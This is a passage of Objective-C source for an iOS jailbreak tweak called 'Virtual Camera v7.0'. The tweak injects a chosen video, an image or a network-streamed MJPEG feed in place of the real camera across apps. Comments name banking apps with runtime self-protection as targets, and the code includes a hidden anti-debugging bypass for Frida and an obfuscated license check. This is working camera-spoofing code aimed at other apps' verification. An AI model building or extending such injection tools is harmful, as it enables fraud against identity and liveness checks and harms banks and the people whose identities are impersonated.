@property (nonatomic, strong) NSMutableData *buffer;
@property (nonatomic, copy) NSString *streamURL;
+ (instancetype)shared;
- (void)startWithURL:(NSString *)url;
- (void)stop;
@end
@implementation MJRcv
+ (instancetype)shared {
    static MJRcv *i; static dispatch_once_t o;
    dispatch_once(&o, ^{ i = [[MJRcv alloc] init]; }); return i;
}
- (void)startWithURL:(NSString *)url {
    [self stop];
    self.streamURL = url;
    self.buffer = [NSMutableData new];
    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration defaultSessionConfiguration];
    cfg.timeoutIntervalForRequest = 5;
    cfg.timeoutIntervalForResource = 0; // no overall timeout for streaming
    self.session = [NSURLSession sessionWithConfiguration:cfg delegate:self delegateQueue:nil];
    NSURL *nsurl = [NSURL URLWithString:url];
    if (!nsurl) {
        vcam_log([NSString stringWithFormat:@"MJPEG: invalid URL: %@", url]);
        return;
    }
    self.task = [self.session dataTaskWithURL:nsurl];
    gStreamActive = YES;
    [self.task resume];
    vcam_log([NSString stringWithFormat:@"MJPEG: connecting to %@", url]);
}
- (void)stop {
    gStreamActive = NO;
    [self.task cancel];
    self.task = nil;
    [self.session invalidateAndCancel];
    self.session = nil;
    self.buffer = nil;
    [[NSFileManager defaultManager] removeItemAtPath:VCAM_STREAM_FRAME error:nil];
    vcam_log(@"MJPEG: stopped");
}
- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveResponse:(NSURLResponse *)response completionHandler:(void (^)(NSURLSessionResponseDisposition))completionHandler {
    static int sRespCount = 0;
    if (sRespCount < 3) {
        sRespCount++;
        vcam_log([NSString stringWithFormat:@"MJPEG: connected, content-type: %@",
            [(NSHTTPURLResponse *)response valueForHTTPHeaderField:@"Content-Type"] ?: @"(nil)"]);
    }
    completionHandler(NSURLSessionResponseAllow);
}
- (void)URLSession:(NSURLSession *)session dataTask:(NSURLSessionDataTask *)dataTask didReceiveData:(NSData *)data {
    [self.buffer appendData:data];
    [self processBuffer];
}
- (void)processBuffer {
    // Search for JPEG markers: FF D8 (start) and FF D9 (end)
    const uint8_t *bytes = (const uint8_t *)self.buffer.bytes;
    NSUInteger len = self.buffer.length;
    if (len < 4) return;

    // Find FF D8 (JPEG SOI)
    NSUInteger start = NSNotFound;
    for (NSUInteger i = 0; i + 1 < len; i++) {
        if (bytes[i] == 0xFF && bytes[i + 1] == 0xD8) {
            start = i;
            break;
        }
    }
    if (start == NSNotFound) {
        // No SOI found, discard everything except last byte
        if (len > 1) [self.buffer replaceBytesInRange:NSMakeRange(0, len - 1) withBytes:NULL length:0];
        return;
    }
    // Discard data before SOI
    if (start > 0) {
        [self.buffer replaceBytesInRange:NSMakeRange(0, start) withBytes:NULL length:0];
        bytes = (const uint8_t *)self.buffer.bytes;
        len = self.buffer.length;
    }

    // Find FF D9 (JPEG EOI) after SOI
    for (NSUInteger i = 2; i + 1 < len; i++) {
        if (bytes[i] == 0xFF && bytes[i + 1] == 0xD9) {
            NSUInteger jpegLen = i + 2;
            NSData *jpegData = [NSData dataWithBytes:bytes length:jpegLen];
            // Remove consumed JPEG from buffer
            [self.buffer replaceBytesInRange:NSMakeRange(0, jpegLen) withBytes:NULL length:0];
            // Decode JPEG → CIImage
            [self decodeJPEG:jpegData];
            return;
        }
    }
    // No complete JPEG yet, wait for more data
}
- (void)decodeJPEG:(NSData *)jpegData {
    @try {
        static int sFrameCount = 0;
        sFrameCount++;
        // Write to shared file so Camera app (different process) can read it
        BOOL written = [jpegData writeToFile:VCAM_STREAM_FRAME atomically:YES];
        if (sFrameCount <= 10 || sFrameCount % 100 == 0) {
            vcam_log([NSString stringWithFormat:@"MJPEG: frame #%d (%lu bytes) write=%@",
                sFrameCount, (unsigned long)jpegData.length, written ? @"OK" : @"FAIL"]);
        }
    } @catch (NSException *e) {
        vcam_log([NSString stringWithFormat:@"MJPEG: decodeJPEG exception: %@", e]);
    }
}
- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
    if (error && error.code != NSURLErrorCancelled) {
        vcam_log([NSString stringWithFormat:@"MJPEG: disconnected: %@", error.localizedDescription]);
        // Delete stale stream file immediately so Camera process shows real camera
        [[NSFileManager defaultManager] removeItemAtPath:VCAM_STREAM_FRAME error:nil];
        // Auto-reconnect after 3 seconds
        NSString *url = self.streamURL;
        if (url && gStreamActive) {
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)),
                dispatch_get_global_queue(0, 0), ^{
                    if (gStreamActive) {
                        vcam_log(@"MJPEG: reconnecting...");
                        [[MJRcv shared] startWithURL:url];
                    }
                });
        }
    }
}
@end

// ============================================================
// USBStreamSrv: TCP listener on port 8765, receives length-prefixed
// JPEG frames pushed from Windows EXE via USB tunnel (pymobiledevice3).
// Started in SpringBoard only. iOS app sandboxes block opening listeners
// in arbitrary processes; SpringBoard has the right entitlements.
//
// Wire protocol (binary, network byte order):
//   [4 bytes uint32 len][len bytes JPEG]
//   [4 bytes uint32 len][len bytes JPEG]
//   ...
//
// On each complete frame, write to VCAM_STREAM_FRAME (same path MJRcv uses).
// All other processes pick up via existing stream.jpg polling.
// ============================================================
#define VCAM_USB_PORT 8765

@interface USBStreamSrv : NSObject
@property (nonatomic, assign) int listenFd;
@property (nonatomic, assign) BOOL running;
@property (nonatomic, assign) int connectedClients;
@property (nonatomic, assign) uint64_t frameCount;
+ (instancetype)shared;
- (void)start;
- (void)stop;
@end

@implementation USBStreamSrv
+ (instancetype)shared {
    static USBStreamSrv *i; static dispatch_once_t o;
    dispatch_once(&o, ^{ i = [[USBStreamSrv alloc] init]; i.listenFd = -1; });
    return i;
}

- (void)start {
    if (self.running) return;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) { vcam_log(@"USBSrv: socket() failed"); return; }
    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(VCAM_USB_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK); // only USB tunnel can reach
    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        vcam_log([NSString stringWithFormat:@"USBSrv: bind(%d) failed errno=%d", VCAM_USB_PORT, errno]);
        close(fd); return;
    }
    if (listen(fd, 4) < 0) { vcam_log(@"USBSrv: listen() failed"); close(fd); return; }
    self.listenFd = fd;
    self.running = YES;
    self.connectedClients = 0;
    self.frameCount = 0;
    vcam_log([NSString stringWithFormat:@"USBSrv: listening on 127.0.0.1:%d", VCAM_USB_PORT]);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self acceptLoop];
    });
}

- (void)stop {
    self.running = NO;
    if (self.listenFd >= 0) { close(self.listenFd); self.listenFd = -1; }
    [[NSFileManager defaultManager] removeItemAtPath:VCAM_STREAM_FRAME error:nil];
    vcam_log(@"USBSrv: stopped");
}

- (void)acceptLoop {
    while (self.running && self.listenFd >= 0) {
        struct sockaddr_in cli; socklen_t clen = sizeof(cli);
        int cfd = accept(self.listenFd, (struct sockaddr *)&cli, &clen);
        if (cfd < 0) {
            if (self.running) { usleep(100000); }
            continue;
        }
        self.connectedClients++;
        vcam_log([NSString stringWithFormat:@"USBSrv: client connected (total=%d)", self.connectedClients]);
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [self clientLoop:cfd];
            self.connectedClients--;
            close(cfd);
            vcam_log([NSString stringWithFormat:@"USBSrv: client disconnected (total=%d)", self.connectedClients]);
        });
    }
}

- (BOOL)readFully:(int)fd buffer:(uint8_t *)buf length:(size_t)len {
    size_t got = 0;
    while (got < len) {
        ssize_t n = recv(fd, buf + got, len - got, 0);
        if (n <= 0) return NO;
        got += n;
    }
    return YES;
}

- (void)clientLoop:(int)fd {
    while (self.running) {
        uint8_t lenBuf[4];
        if (![self readFully:fd buffer:lenBuf length:4]) break;
        uint32_t frameLen = ((uint32_t)lenBuf[0] << 24) | ((uint32_t)lenBuf[1] << 16)
                          | ((uint32_t)lenBuf[2] << 8)  | (uint32_t)lenBuf[3];
        if (frameLen == 0 || frameLen > 16 * 1024 * 1024) {
            vcam_log([NSString stringWithFormat:@"USBSrv: bad frame len %u", frameLen]);
            break;
        }
        // Drop frame if too large (>2 MB) — protects iOS from OOM-kill.
        // PC should push at reasonable quality (1080p + Q80 ≈ 200-500 KB/frame).
        if (frameLen > 2 * 1024 * 1024) {
            vcam_log([NSString stringWithFormat:@"USBSrv: frame too large %u bytes, dropping. Lower PC resolution/quality.", frameLen]);
            // Still need to consume the bytes
            NSMutableData *trash = [NSMutableData dataWithLength:frameLen];
            [self readFully:fd buffer:(uint8_t *)trash.mutableBytes length:frameLen];
            continue;
        }
        NSMutableData *jpegData = [NSMutableData dataWithLength:frameLen];
        if (![self readFully:fd buffer:(uint8_t *)jpegData.mutableBytes length:frameLen]) break;
        // Use direct write (not atomic-via-tempfile) for speed.
        // Atomic was causing 30 × big-write per second → OOM → SpringBoard crash.
        // Brief partial reads on consumer side are tolerable (next frame fixes it).
        [jpegData writeToFile:VCAM_STREAM_FRAME atomically:NO];
        self.frameCount++;
        if (self.frameCount <= 5 || self.frameCount % 200 == 0) {
            vcam_log([NSString stringWithFormat:@"USBSrv: frame #%llu (%u bytes)", self.frameCount, frameLen]);
        }
    }
}
@end

// PhotosUI forward declarations (PHPickerViewController, iOS 14+).
// We use this instead of UIImagePickerController for VIDEO selection because
// UIImagePickerController ALWAYS transcodes to lower-quality H.264 (≤720p),
// breaking dim-perfect passthrough into 1080×1920 camera buffers.
// preferredAssetRepresentationMode = 1 ("Current") returns the ORIGINAL file
// untouched — preserves HEVC, 4K, full bit-rate.
@class PHPickerViewController, PHPickerResult, PHPickerConfiguration, PHPickerFilter;
@protocol PHPickerViewControllerDelegate <NSObject>
- (void)picker:(PHPickerViewController *)picker didFinishPicking:(NSArray<PHPickerResult *> *)results;
@end
@interface PHPickerFilter : NSObject
+ (PHPickerFilter *)videosFilter;
+ (PHPickerFilter *)imagesFilter;
@end
@interface PHPickerConfiguration : NSObject
- (instancetype)init;
@property (nonatomic, copy) PHPickerFilter *filter;
@property (nonatomic) NSInteger selectionLimit;
@property (nonatomic) NSInteger preferredAssetRepresentationMode;
@end
@interface PHPickerViewController : UIViewController
- (instancetype)initWithConfiguration:(PHPickerConfiguration *)configuration;
@property (nonatomic, weak) id<PHPickerViewControllerDelegate> delegate;
@end
@interface PHPickerResult : NSObject
@property (nonatomic, strong) NSItemProvider *itemProvider;
@end

// --- UI ---
@interface UIHlp : NSObject <UIImagePickerControllerDelegate, UINavigationControllerDelegate, UIDocumentPickerDelegate, PHPickerViewControllerDelegate>
+ (instancetype)shared;
@end
@implementation UIHlp
+ (instancetype)shared {
    static UIHlp *i; static dispatch_once_t o;
    dispatch_once(&o, ^{ i = [[UIHlp alloc] init]; }); return i;
}

// PHPicker callback — preferred over UIImagePickerController for video (no transcoding).
- (void)picker:(PHPickerViewController *)picker didFinishPicking:(NSArray<PHPickerResult *> *)results {
    [picker dismissViewControllerAnimated:YES completion:nil];
    if (results.count == 0) return;
    PHPickerResult *r = results.firstObject;
    NSItemProvider *prov = r.itemProvider;
    if (!prov) return;
    if ([prov hasItemConformingToTypeIdentifier:@"public.movie"]) {
        [prov loadFileRepresentationForTypeIdentifier:@"public.movie"
            completionHandler:^(NSURL *url, NSError *error) {
                if (!url || error) {
                    vcam_log([NSString stringWithFormat:@"PHPicker video load err: %@", error]);
                    return;
                }
                // PHPicker URL is a temp file that gets cleaned up after this callback.
                // Copy to our own temp first, then run AVAssetExportSession on it.
                NSString *stagedPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vcam_picked_input.mov"];
                NSFileManager *fm = [NSFileManager defaultManager];
                [fm removeItemAtPath:stagedPath error:nil];
                NSError *cpErr = nil;
                [fm copyItemAtURL:url toURL:[NSURL fileURLWithPath:stagedPath] error:&cpErr];
                if (cpErr) { vcam_log([NSString stringWithFormat:@"PHPicker stage copy err: %@", cpErr]); return; }

                // AVAssetExportPresetPassthrough — same approach as vcam123:
                // re-mux into clean .mov container (fixes metadata, normalizes timing tracks)
                // WITHOUT re-encoding the video stream. Source HEVC stays HEVC, H.264 stays H.264.
                // AVAssetReader downstream decodes this normalized file far more reliably
                // (especially in restricted processes like banking apps with RASP).
                AVURLAsset *asset = [AVURLAsset URLAssetWithURL:[NSURL fileURLWithPath:stagedPath] options:nil];
                AVAssetExportSession *exp = [[AVAssetExportSession alloc] initWithAsset:asset
                                                presetName:AVAssetExportPresetPassthrough];
                NSString *outPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"vcam_picked_output.mov"];
                [fm removeItemAtPath:outPath error:nil];
                exp.outputURL = [NSURL fileURLWithPath:outPath];
                exp.outputFileType = AVFileTypeQuickTimeMovie;  // .mov — Apple native container
                [exp exportAsynchronouslyWithCompletionHandler:^{
                    dispatch_async(dispatch_get_main_queue(), ^{
                        NSFileManager *fm2 = [NSFileManager defaultManager];
                        if (exp.status != AVAssetExportSessionStatusCompleted) {
                            vcam_log([NSString stringWithFormat:@"Export failed status=%ld err=%@", (long)exp.status, exp.error]);
                            // Fallback: use the staged copy as-is
                            [fm2 removeItemAtPath:VCAM_VIDEO error:nil];
                            [fm2 removeItemAtPath:VCAM_IMAGE error:nil];
                            [fm2 copyItemAtPath:stagedPath toPath:VCAM_VIDEO error:nil];
                        } else {
                            [fm2 removeItemAtPath:VCAM_VIDEO error:nil];
                            [fm2 removeItemAtPath:VCAM_IMAGE error:nil];
                            [fm2 copyItemAtPath:outPath toPath:VCAM_VIDEO error:nil];
                            vcam_log(@"PHPicker → AVAssetExportPresetPassthrough → video.mp4 (clean .mov container)");
                        }
                        [fm2 removeItemAtPath:stagedPath error:nil];
                        [fm2 removeItemAtPath:outPath error:nil];
                        [@"1" writeToFile:VCAM_FLAG atomically:YES encoding:NSUTF8StringEncoding error:nil];
                        [gLockA lock]; gReaderA = nil; gOutputA = nil; [gLockA unlock];
                        [gLockB lock]; gReaderB = nil; gOutputB = nil; [gLockB unlock];
                        if (gLockPT) { [gLockPT lock]; gReaderPT = nil; gOutputPT = nil; [gLockPT unlock]; }
                        gStaticImage = nil;
                        if (gStaticCGImage) { CGImageRelease(gStaticCGImage); gStaticCGImage = NULL; }
                        unsigned long long sz = [[fm2 attributesOfItemAtPath:VCAM_VIDEO error:nil] fileSize];
                        vcam_log([NSString stringWithFormat:@"Final video.mp4 (%llu bytes)", sz]);
                    });
                }];
            }];
    } else if ([prov hasItemConformingToTypeIdentifier:@"public.image"]) {
        [prov loadDataRepresentationForTypeIdentifier:@"public.image"
            completionHandler:^(NSData *data, NSError *error) {
                if (!data || error) return;
                dispatch_async(dispatch_get_main_queue(), ^{
                    NSFileManager *fm = [NSFileManager defaultManager];
                    [fm removeItemAtPath:VCAM_IMAGE error:nil];
                    [fm removeItemAtPath:VCAM_VIDEO error:nil];
                    [data writeToFile:VCAM_IMAGE atomically:YES];
                    [@"1" writeToFile:VCAM_FLAG atomically:YES encoding:NSUTF8StringEncoding error:nil];
                    gStaticImage = nil;
                    if (gStaticCGImage) { CGImageRelease(gStaticCGImage); gStaticCGImage = NULL; }
                    vcam_log(@"PHPicker image saved");
                });
            }];
    }
}
- (void)imagePickerController:(UIImagePickerController *)p didFinishPickingMediaWithInfo:(NSDictionary *)info {
    [p dismissViewControllerAnimated:YES completion:nil];

    // Check if it's a video
    NSURL *videoURL = info[UIImagePickerControllerMediaURL];
    if (videoURL) {
        [[NSFileManager defaultManager] removeItemAtPath:VCAM_VIDEO error:nil];
        [[NSFileManager defaultManager] removeItemAtPath:VCAM_IMAGE error:nil];
        [[NSFileManager defaultManager] copyItemAtURL:videoURL toURL:[NSURL fileURLWithPath:VCAM_VIDEO] error:nil];
        [@"1" writeToFile:VCAM_FLAG atomically:YES encoding:NSUTF8StringEncoding error:nil];
        [gLockA lock]; gReaderA = nil; gOutputA = nil; [gLockA unlock];
        [gLockB lock]; gReaderB = nil; gOutputB = nil; [gLockB unlock];
        gStaticImage = nil;
        if (gStaticCGImage) { CGImageRelease(gStaticCGImage); gStaticCGImage = NULL; }
        vcam_log(@"Video selected from album");
        return;
    }

    // Check if it's an image
    UIImage *image = info[UIImagePickerControllerOriginalImage];
    if (image) {
        NSData *jpegData = UIImageJPEGRepresentation(image, 0.9);
        if (jpegData) {
            [[NSFileManager defaultManager] removeItemAtPath:VCAM_IMAGE error:nil];
            [[NSFileManager defaultManager] removeItemAtPath:VCAM_VIDEO error:nil];
            [jpegData writeToFile:VCAM_IMAGE atomically:YES];
            [@"1" writeToFile:VCAM_FLAG atomically:YES encoding:NSUTF8StringEncoding error:nil];
            [gLockA lock]; gReaderA = nil; gOutputA = nil; [gLockA unlock];
            [gLockB lock]; gReaderB = nil; gOutputB = nil; [gLockB unlock];
            gStaticImage = nil;
            if (gStaticCGImage) { CGImageRelease(gStaticCGImage); gStaticCGImage = NULL; }
            vcam_log(@"Image selected from album");
        }
        return;
    }
}
- (void)imagePickerControllerDidCancel:(UIImagePickerController *)p { [p dismissViewControllerAnimated:YES completion:nil]; }
- (void)documentPicker:(UIDocumentPickerViewController *)c didPickDocumentsAtURLs:(NSArray<NSURL *> *)urls {
    NSURL *url = urls.firstObject; if (!url) return;
    BOOL sec = [url startAccessingSecurityScopedResource];
    [[NSFileManager defaultManager] removeItemAtPath:VCAM_VIDEO error:nil];
    [[NSFileManager defaultManager] removeItemAtPath:VCAM_IMAGE error:nil];
    [[NSFileManager defaultManager] copyItemAtURL:url toURL:[NSURL fileURLWithPath:VCAM_VIDEO] error:nil];
    if (sec) [url stopAccessingSecurityScopedResource];
    [@"1" writeToFile:VCAM_FLAG atomically:YES encoding:NSUTF8StringEncoding error:nil];
    [gLockA lock]; gReaderA = nil; gOutputA = nil; [gLockA unlock];
    [gLockB lock]; gReaderB = nil; gOutputB = nil; [gLockB unlock];
    gStaticImage = nil;
    if (gStaticCGImage) { CGImageRelease(gStaticCGImage); gStaticCGImage = NULL; }
    vcam_log(@"Video selected from files");
}
- (void)documentPickerWasCancelled:(UIDocumentPickerViewController *)c {}
@end

static UIViewController *vcam_topVC(void) {
    UIWindow *w = nil;
    for (UIScene *s in [UIApplication sharedApplication].connectedScenes) {
        if ([s isKindOfClass:[UIWindowScene class]]) {
            for (UIWindow *win in ((UIWindowScene *)s).windows) { if (win.isKeyWindow) { w = win; break; } }
            if (w) break;
        }
    }
    if (!w) w = [UIApplication sharedApplication].windows.firstObject;
    if (!w) return nil;
    UIViewController *vc = w.rootViewController;
    while (vc.presentedViewController) vc = vc.presentedViewController;
    return vc;
}

static void vcam_showMenu(void) {
    // Boot cooldown: don't show menu within 15 seconds of tweak load
    // SpringBoard UI may not be fully ready, presenting alerts too early can crash
    if (gBootTime > 0 && (CACurrentMediaTime() - gBootTime) < 5.0) {
        vcam_log(@"showMenu: boot cooldown, skipping");
        return;
    }
    UIViewController *topVC = vcam_topVC();
    if (!topVC || [topVC isKindOfClass:[UIAlertController class]]) return;

    // Authorization check
    if (!_isAuth()) {
        if (_chkLC()) {
            _setAuth(YES);
        } else {
            _shAct();
            return;
        }
    }

    BOOL en = vcam_flagExists();
    BOOL hv = vcam_videoExists();
    BOOL hi = vcam_imageExists();

    // Read license expiry and uses from cache
    NSString *expInfo = _isAuth() ? @"未知" : @"已过期";
    NSString *usesInfo = nil;
    @try {
        NSData *ld = [NSData dataWithContentsOfFile:_licPath()];
        if (ld && ld.length >= 10) {
            NSString *b64 = [[NSString alloc] initWithData:ld encoding:NSUTF8StringEncoding];
            NSData *dec = [[NSData alloc] initWithBase64EncodedString:b64 options:0];
            if (dec) {
                NSMutableData *md = [NSMutableData dataWithData:dec];
                _xorBuf((uint8_t *)[md mutableBytes], md.length);
                NSDictionary *d = [NSJSONSerialization JSONObjectWithData:md options:0 error:nil];
                if (d && (d[@"re"] || d[@"e"])) {
                    double expMs = d[@"re"] ? [d[@"re"] doubleValue] : [d[@"e"] doubleValue];
                    double nowMs = [[NSDate date] timeIntervalSince1970] * 1000.0;
                    double remain = expMs - nowMs;
                    if (remain > 0) {
                        double days = remain / 86400000.0;
                        if (days >= 1.0) {
                            expInfo = [NSString stringWithFormat:@"%.1f 天", days];
                        } else {
                            double hours = remain / 3600000.0;
                            expInfo = [NSString stringWithFormat:@"%.1f 小时", hours];
                        }
                    } else {
                        expInfo = @"已过期";
                    }
                }
                if (d[@"ul"]) {
                    usesInfo = [NSString stringWithFormat:@"%d", [d[@"ul"] intValue]];
                } else {
                    usesInfo = @"0";
                }
            }
        }
    } @catch (NSException *e) {}

    // Source status
    NSString *src;
    if (gStreamActive) {
        NSString *streamURL = [MJRcv shared].streamURL ?: @"";
        // Extract host:port from URL
        NSURL *u = [NSURL URLWithString:streamURL];
        NSString *hostInfo = u.host ?: streamURL;
        if (u.port) hostInfo = [NSString stringWithFormat:@"%@:%@", hostInfo, u.port];
        src = [NSString stringWithFormat:@"MJPEG 直播 (%@)", hostInfo];
    } else if (hi) {
        unsigned long long sz = [[[NSFileManager defaultManager] attributesOfItemAtPath:VCAM_IMAGE error:nil] fileSize];
        src = [NSString stringWithFormat:@"图片 (%.1f KB)", sz / 1024.0];
    } else if (hv) {
        unsigned long long sz = [[[NSFileManager defaultManager] attributesOfItemAtPath:VCAM_VIDEO error:nil] fileSize];
        src = [NSString stringWithFormat:@"视频 (%.1f MB)", sz / 1048576.0];
    } else {
        src = @"无";
    }

    NSString *usesStr = usesInfo ?: @"0";
    NSString *msgText = [NSString stringWithFormat:@"授权剩余时间:  %@\n授权剩余次数:  %@\n开关: %@\n来源: %@\n快速按音量+再按音量-进入菜单\n视频、图片、推流都可以\n请勿用于非法途径,仅供娱乐操作\n添加视频的路径是：\n/var/jb/var/mobile/\nLibrary/vcamplus/\n多次卡密是可以同一个多次激活的", expInfo, usesStr, en ? @"已开启" : @"已关闭", src];
    UIAlertController *a = [UIAlertController alertControllerWithTitle:@"Virtual Camera v7.0"
        message:msgText preferredStyle:UIAlertControllerStyleAlert];
    // Colored attributed message
    @try {
        NSMutableAttributedString *attr = [[NSMutableAttributedString alloc] initWithString:msgText attributes:@{NSFontAttributeName: [UIFont systemFontOfSize:13]}];
        UIColor *hlColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.4 alpha:1.0]; // bright green
        // Highlight expInfo value
        NSRange expRange = [msgText rangeOfString:expInfo];
        if (expRange.location != NSNotFound) {
            [attr addAttributes:@{NSForegroundColorAttributeName: hlColor, NSFontAttributeName: [UIFont boldSystemFontOfSize:14]} range:expRange];
        }
        // Highlight usesStr value (find it after "授权剩余次数:  ")
        NSRange usesSearch = [msgText rangeOfString:[NSString stringWithFormat:@"授权剩余次数:  %@", usesStr]];
        if (usesSearch.location != NSNotFound) {
            NSRange usesValRange = NSMakeRange(usesSearch.location + usesSearch.length - usesStr.length, usesStr.length);
            [attr addAttributes:@{NSForegroundColorAttributeName: hlColor, NSFontAttributeName: [UIFont boldSystemFontOfSize:14]} range:usesValRange];
        }
        [a setValue:attr forKey:@"attributedMessage"];
    } @catch (NSException *e) {}

    [a addAction:[UIAlertAction actionWithTitle:@"选择视频" style:UIAlertActionStyleDefault handler:^(UIAlertAction *x) {
        dispatch_async(dispatch_get_main_queue(), ^{
            UIViewController *vc = vcam_topVC(); if (!vc) return;
            // Use PHPickerViewController (iOS 14+) instead of UIImagePickerController:
            // PHPicker preserves the ORIGINAL file (HEVC, 4K, etc.) when
            // preferredAssetRepresentationMode = 1 ("Current"). UIImagePicker
            // always transcodes to ≤720p H.264 which breaks our passthrough.
            Class cfgCls = NSClassFromString(@"PHPickerConfiguration");
            Class pickCls = NSClassFromString(@"PHPickerViewController");
            Class fltCls = NSClassFromString(@"PHPickerFilter");
            if (cfgCls && pickCls && fltCls) {
                PHPickerConfiguration *cfg = [[cfgCls alloc] init];
                cfg.filter = [fltCls performSelector:@selector(videosFilter)];
                cfg.selectionLimit = 1;
                cfg.preferredAssetRepresentationMode = 1; // Current (no transcode)
                PHPickerViewController *p = [[pickCls alloc] initWithConfiguration:cfg];
                p.delegate = [UIHlp shared];
                [vc presentViewController:p animated:YES completion:nil];
            } else {
                // Fallback (shouldn't happen on iOS 14+)
                UIImagePickerController *p = [[UIImagePickerController alloc] init];
                p.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
                p.mediaTypes = @[@"public.movie"]; p.delegate = [UIHlp shared];
                p.videoQuality = UIImagePickerControllerQualityTypeHigh;
                p.allowsEditing = NO;
                [vc presentViewController:p animated:YES completion:nil];
            }
        });
    }]];

    [a addAction:[UIAlertAction actionWithTitle:@"选择图片" style:UIAlertActionStyleDefault handler:^(UIAlertAction *x) {
        dispatch_async(dispatch_get_main_queue(), ^{
            UIViewController *vc = vcam_topVC(); if (!vc) return;
            UIImagePickerController *p = [[UIImagePickerController alloc] init];
            p.sourceType = UIImagePickerControllerSourceTypePhotoLibrary;
            p.mediaTypes = @[@"public.image"]; p.delegate = [UIHlp shared];
            [vc presentViewController:p animated:YES completion:nil];
        });
    }]];

    if (gStreamActive) {
        [a addAction:[UIAlertAction actionWithTitle:@"停止直播流" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *x) {
            [[MJRcv shared] stop];
            vcam_log(@"MJPEG: stopped by user");
        }]];
    } else {
        [a addAction:[UIAlertAction actionWithTitle:@"直播拉流" style:UIAlertActionStyleDefault handler:^(UIAlertAction *x) {
            dispatch_async(dispatch_get_main_queue(), ^{
                UIViewController *vc = vcam_topVC(); if (!vc) return;
                // Read last saved URL
                NSString *lastURL = [NSString stringWithContentsOfFile:VCAM_STREAM encoding:NSUTF8StringEncoding error:nil];
                if (!lastURL || lastURL.length == 0) lastURL = @"http://192.168.1.100:8080";

                UIAlertController *input = [UIAlertController alertControllerWithTitle:@"MJPEG 直播流"
                    message:@"输入 MJPEG 流地址\n例: http://电脑IP:端口"
                    preferredStyle:UIAlertControllerStyleAlert];
                [input addTextFieldWithConfigurationHandler:^(UITextField *tf) {
                    tf.text = lastURL;
                    tf.placeholder = @"http://192.168.1.100:8080";
                    tf.keyboardType = UIKeyboardTypeURL;
                    tf.autocorrectionType = UITextAutocorrectionTypeNo;
                }];
                [input addAction:[UIAlertAction actionWithTitle:@"连接" style:UIAlertActionStyleDefault handler:^(UIAlertAction *x2) {
                    NSString *url = input.textFields.firstObject.text;
                    if (!url || url.length == 0) return;
                    // Save URL for next time
                    [url writeToFile:VCAM_STREAM atomically:YES encoding:NSUTF8StringEncoding error:nil];
                    // Ensure VCam is enabled
                    [@"1" writeToFile:VCAM_FLAG atomically:YES encoding:NSUTF8StringEncoding error:nil];
                    // Start stream
                    [[MJRcv shared] startWithURL:url];
                }]];
                [input addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
                [vc presentViewController:input animated:YES completion:nil];
            });
        }]];
    }

    [a addAction:[UIAlertAction actionWithTitle:@"悬浮控制" style:UIAlertActionStyleDefault handler:^(UIAlertAction *x) {
        [FWCtrl show];
    }]];

    // Dev mode toggle (anti-debug bypass) — UI hidden; re-enable by removing #if 0 below.
    // Toggles /var/jb/var/mobile/Library/vcamplus/.devmode . _isDevMode() still reads the
    // file so the underlying mechanism works; only the floating-window button is hidden.
#if 0
    {
        NSString *devPath = [VCAM_DIR stringByAppendingPathComponent:@".devmode"];
        BOOL devOn = [[NSFileManager defaultManager] fileExistsAtPath:devPath];
        NSString *title = devOn
            ? @"反调试: 已绕过 (点击恢复)"
            : @"反调试: 正常 (点击绕过 - Frida 兼容)";
        [a addAction:[UIAlertAction actionWithTitle:title style:UIAlertActionStyleDefault handler:^(UIAlertAction *x) {
            NSFileManager *fm = [NSFileManager defaultManager];
            if ([fm fileExistsAtPath:devPath]) {
                [fm removeItemAtPath:devPath error:nil];
            } else {
                [@"" writeToFile:devPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
            }
            BOOL nowOn = [fm fileExistsAtPath:devPath];
            UIAlertController *toast = [UIAlertController alertControllerWithTitle:nil
                message:[NSString stringWithFormat:@"反调试 %@\n注销重启 SpringBoard 或 respring 后生效",
                    nowOn ? @"已绕过 (Frida 兼容模式)" : @"已恢复 (正常模式)"]
                preferredStyle:UIAlertControllerStyleAlert];
            [toast addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
            [topVC presentViewController:toast animated:YES completion:nil];
        }]];
    }
#endif

    if (en) {
        [a addAction:[UIAlertAction actionWithTitle:@"关闭虚拟相机" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *x) {
            [[NSFileManager defaultManager] removeItemAtPath:VCAM_FLAG error:nil];
            [gLockA lock]; gReaderA = nil; gOutputA = nil; [gLockA unlock];
            [gLockB lock]; gReaderB = nil; gOutputB = nil; [gLockB unlock];
            if (gStreamActive) [[MJRcv shared] stop];
            [[NSFileManager defaultManager] removeItemAtPath:VCAM_STREAM_FRAME error:nil];
        }]];
    } else {
        [a addAction:[UIAlertAction actionWithTitle:@"开启虚拟相机" style:UIAlertActionStyleDefault handler:^(UIAlertAction *x) {
            [@"1" writeToFile:VCAM_FLAG atomically:YES encoding:NSUTF8StringEncoding error:nil];
        }]];
    }

    [a addAction:[UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:nil]];
    [topVC presentViewController:a animated:YES completion:nil];
}

// ============================================================
// Pure runtime hook installation
// ============================================================
// Hook capturePhotoWithSettings:delegate: on a specific class (base or subclass)
static NSMutableSet *gHookedPhotoCaptureClasses = nil;
